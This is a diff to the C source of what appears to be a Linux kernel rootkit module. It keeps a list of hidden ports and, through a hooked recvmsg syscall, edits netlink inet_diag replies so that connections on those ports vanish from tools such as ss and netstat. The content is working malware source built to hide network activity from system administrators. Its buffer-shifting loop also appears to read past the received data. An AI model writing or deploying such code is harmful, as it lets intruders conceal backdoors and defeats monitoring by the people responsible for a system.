@@ -1,6 +1,7 @@
 #include <linux/kernel.h>
 #include <linux/seq_file.h>
 #include <net/inet_sock.h>
+#include <linux/inet_diag.h>
 #include <linux/byteorder/generic.h>
 
 #include "common.h"
@@ -16,7 +17,7 @@ port_list_t hidden_ports = {
 
 port_list_t_ptr hidden_ports_tail = &hidden_ports;
 
-static asmlinkage ssize_t (*sys_recvmsg)(int, struct user_msghdr __user *, unsigned);
+static asmlinkage ssize_t (*sys_recvmsg)(struct pt_regs *);
 
 static int (*tcp4_seq_show)(struct seq_file *seq, void *v);
 static int (*udp4_seq_show)(struct seq_file *seq, void *v);
@@ -113,7 +114,16 @@ find_port_in_list(port_list_t_ptr head, port_t port, proto proto)
 {
     port_list_t_ptr i;
     for (i = head; i; i = i->next)
-        if (i->port == port && i->proto == proto)
+        if (proto == -1) {
+            if (i->port == port
+                && (i->proto == tcp4
+                    || i->proto == udp4
+                    || i->proto == tcp6
+                    || i->proto == udp6))
+            {
+                return i;
+            }
+        } else if (i->port == port && i->proto == proto)
             return i;
 
     return NULL;
@@ -161,9 +171,37 @@ remove_port_from_list(port_list_t_ptr list, port_t port, proto proto)
 }
 
 asmlinkage ssize_t
-g7_recvmsg(int fd, struct user_msghdr __user *msg, unsigned flags)
+g7_recvmsg(struct pt_regs *pt_regs)
 {
-    return sys_recvmsg(fd, msg, flags);
+    size_t i;
+    ssize_t ret, len;
+    struct nlmsghdr *nh;
+
+    if ((len = ret = sys_recvmsg(pt_regs)) < 0)
+        return ret;
+
+    nh = (struct nlmsghdr *)
+        ((struct user_msghdr *)pt_regs->si)->msg_iov->iov_base;
+
+    while (NLMSG_OK(nh, len)) {
+        int src = ntohs(((struct inet_diag_msg *)NLMSG_DATA(nh))->id.idiag_sport);
+        int dst = ntohs(((struct inet_diag_msg *)NLMSG_DATA(nh))->id.idiag_dport);
+
+        if (!(list_contains_port(&hidden_ports, src, -1)
+            || list_contains_port(&hidden_ports, dst, -1)))
+        {
+            nh = NLMSG_NEXT(nh, len);
+            continue;
+        }
+
+        int alignment = NLMSG_ALIGN(nh->nlmsg_len);
+        for (i = 0; i < len; ++i)
+            ((char *)nh)[i] = ((char *)nh)[i + alignment];
+
+        ret -= alignment;
+    }
+
+    return ret;
 }
 
 //seq and v include all the info we need
